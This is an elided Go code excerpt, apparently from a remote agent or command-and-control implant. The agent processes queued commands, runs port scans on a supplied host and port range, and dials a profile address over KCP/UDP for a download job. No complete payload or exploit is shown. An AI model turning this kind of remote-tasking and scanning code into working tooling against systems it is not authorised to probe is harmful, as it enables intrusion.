...
func TaskProcess(commands [][]byte) [][]byte {
	...
	for _, cmdBytes := range commands {
		...
		case utils.COMMAND_SCAN:
			data, err = taskScan(command.Data)
...
func jobDownloadStart(paramsData []byte) ([]byte, error) {
	...
	if profile.Protocol == "udp" {
		...
		if profile.UseSSL {
			...
			kcpConn, err = kcp.DialWithOptions(profile.Addresses[0], nil, 10, 3)
			if err != nil {
				return nil, err
			}
...
// taskScan 处理端口扫描命令
func taskScan(data []byte) ([]byte, error) {
	var params utils.ParamsScan
	...
	// 调用扫描函数
	args := []string{params.Host, params.PortRange}
	result := functions.HandleScanCommand(args)

	// 返回结果
	ansData, _ := msgpack.Marshal(utils.AnsScan{Output: result})
	return ansData, nil
}
